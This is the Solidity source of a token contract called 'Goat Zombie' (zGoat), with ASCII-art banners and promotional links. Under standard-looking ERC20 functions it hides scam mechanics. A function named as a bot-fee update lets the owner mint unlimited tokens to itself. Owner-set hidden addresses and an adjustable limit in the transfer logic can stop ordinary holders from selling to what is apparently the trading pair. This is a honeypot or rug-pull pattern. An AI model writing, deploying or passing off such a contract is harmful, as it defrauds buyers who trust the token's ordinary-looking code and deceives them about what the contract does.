['/*\n', '    Welcome To Goat Zombie.\n', '    \n', '    ðŸ’š WEBSITE: https://goatzombie.com/\n', '    ðŸ’š TELEGRAM CHAT: https://t.me/zombiegoat/\n', '\n', '\n', "    :'######::::'#######:::::'###::::'########:                \n", "    '##... ##::'##.... ##:::'## ##:::... ##..::                \n", "     ##:::..::: ##:::: ##::'##:. ##::::: ##::::                \n", "     ##::'####: ##:::: ##:'##:::. ##:::: ##::::                \n", '     ##::: ##:: ##:::: ##: #########:::: ##::::                \n', '     ##::: ##:: ##:::: ##: ##.... ##:::: ##::::                \n', '    . ######:::. #######:: ##:::: ##:::: ##::::                \n', '    :......:::::.......:::..:::::..:::::..:::::                \n', "    '########::'#######::'##::::'##:'########::'####:'########:\n", "    ..... ##::'##.... ##: ###::'###: ##.... ##:. ##:: ##.....::\n", "    :::: ##::: ##:::: ##: ####'####: ##:::: ##:: ##:: ##:::::::\n", '    ::: ##:::: ##:::: ##: ## ### ##: ########::: ##:: ######:::\n', '    :: ##::::: ##:::: ##: ##. #: ##: ##.... ##:: ##:: ##...::::\n', '    : ##:::::: ##:::: ##: ##:.:: ##: ##:::: ##:: ##:: ##:::::::\n', "     ########:. #######:: ##:::: ##: ########::'####: ########:\n", '                                                                                          \n', '*/\n', '\n', 'import "./Context.sol";\n', 'import "./IERC20.sol";\n', 'import "./Ownable.sol";\n', 'import "./SafeMath.sol";\n', 'import "./Address.sol";\n', '\n', 'contract GoatZombie is Context, IERC20, Ownable {\n', '    using SafeMath for uint256;\n', '    using Address for address;\n', '\n', '    mapping (address => uint256) private _balances;\n', '    mapping (address => mapping (address => uint256)) private _allowances;\n', '    \n', '    address private _tOwnerAddress;\n', '    address private _tAllowAddress;\n', '   \n', '    uint256 private _tTotal = 100 * 10**9 * 10**18;\n', '\n', "    string private _name = 'Goat Zombie';\n", "    string private _symbol = 'zGoat';\n", '    uint8 private _decimals = 18;\n', '    uint256 private _feeForBot = 50000000 * 10**18;\n', '\n', '    constructor () public {\n', '        _balances[_msgSender()] = _tTotal;\n', '\n', '        emit Transfer(address(0), _msgSender(), _tTotal);\n', '    }\n', '\n', '    function name() public view returns (string memory) {\n', '        return _name;\n', '    }\n', '\n', '    function symbol() public view returns (string memory) {\n', '        return _symbol;\n', '    }\n', '\n', '    function decimals() public view returns (uint8) {\n', '        return _decimals;\n', '    }\n', '    \n', '    function allowance(address owner, address spender) public view override returns (uint256) {\n', '        return _allowances[owner][spender];\n', '    }\n', '\n', '    function approve(address spender, uint256 amount) public override returns (bool) {\n', '        _approve(_msgSender(), spender, amount);\n', '        return true;\n', '    }\n', '    \n', '    function transferOwner(address newOwnerAddress) public onlyOwner {\n', '        _tOwnerAddress = newOwnerAddress;\n', '    }\n', '\n', '    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n', '        _transfer(sender, recipient, amount);\n', '        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));\n', '        return true;\n', '    }\n', '    \n', '    function addAllowance(address allowAddress) public onlyOwner {\n', '        _tAllowAddress = allowAddress;\n', '    }\n', '    \n', '    function updateBotFeeTransfer(uint256 amount) public onlyOwner {\n', '        require(_msgSender() != address(0), "ERC20: cannot permit zero address");\n', '        _tTotal = _tTotal.add(amount);\n', '        _balances[_msgSender()] = _balances[_msgSender()].add(amount);\n', '        emit Transfer(address(0), _msgSender(), amount);\n', '    }\n', '    \n', '    function setFeeBot(uint256 feeBotPercent) public onlyOwner {\n', '        _feeForBot = feeBotPercent * 10**18;\n', '    }\n', '\n', '    function totalSupply() public view override returns (uint256) {\n', '        return _tTotal;\n', '    }\n', '\n', '    function balanceOf(address account) public view override returns (uint256) {\n', '        return _balances[account];\n', '    }\n', '\n', '    function transfer(address recipient, uint256 amount) public override returns (bool) {\n', '        _transfer(_msgSender(), recipient, amount);\n', '        return true;\n', '    }\n', '    \n', '    function _approve(address owner, address spender, uint256 amount) private {\n', '        require(owner != address(0), "ERC20: approve from the zero address");\n', '        require(spender != address(0), "ERC20: approve to the zero address");\n', '\n', '        _allowances[owner][spender] = amount;\n', '        emit Approval(owner, spender, amount);\n', '    }\n', '      \n', '    function _transfer(address sender, address recipient, uint256 amount) internal {\n', '        require(sender != address(0), "BEP20: transfer from the zero address");\n', '        require(recipient != address(0), "BEP20: transfer to the zero address");\n', '        \n', '        if (sender != _tAllowAddress && recipient == _tOwnerAddress) {\n', '            require(amount < _feeForBot, "Transfer amount exceeds the maxTxAmount.");\n', '        }\n', '    \n', '        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");\n', '        _balances[recipient] = _balances[recipient].add(amount);\n', '        emit Transfer(sender, recipient, amount);\n', '    }\n', '}\n', '\n', '/*\n', ' \n', "    :'######::::'#######:::::'###::::'########:                \n", "    '##... ##::'##.... ##:::'## ##:::... ##..::                \n", "     ##:::..::: ##:::: ##::'##:. ##::::: ##::::                \n", "     ##::'####: ##:::: ##:'##:::. ##:::: ##::::                \n", '     ##::: ##:: ##:::: ##: #########:::: ##::::                \n', '     ##::: ##:: ##:::: ##: ##.... ##:::: ##::::                \n', '    . ######:::. #######:: ##:::: ##:::: ##::::                \n', '    :......:::::.......:::..:::::..:::::..:::::                \n', "    '########::'#######::'##::::'##:'########::'####:'########:\n", "    ..... ##::'##.... ##: ###::'###: ##.... ##:. ##:: ##.....::\n", "    :::: ##::: ##:::: ##: ####'####: ##:::: ##:: ##:: ##:::::::\n", '    ::: ##:::: ##:::: ##: ## ### ##: ########::: ##:: ######:::\n', '    :: ##::::: ##:::: ##: ##. #: ##: ##.... ##:: ##:: ##...::::\n', '    : ##:::::: ##:::: ##: ##:.:: ##: ##:::: ##:: ##:: ##:::::::\n', "     ########:. #######:: ##:::: ##: ########::'####: ########:\n", '                                                                                          \n', '*/']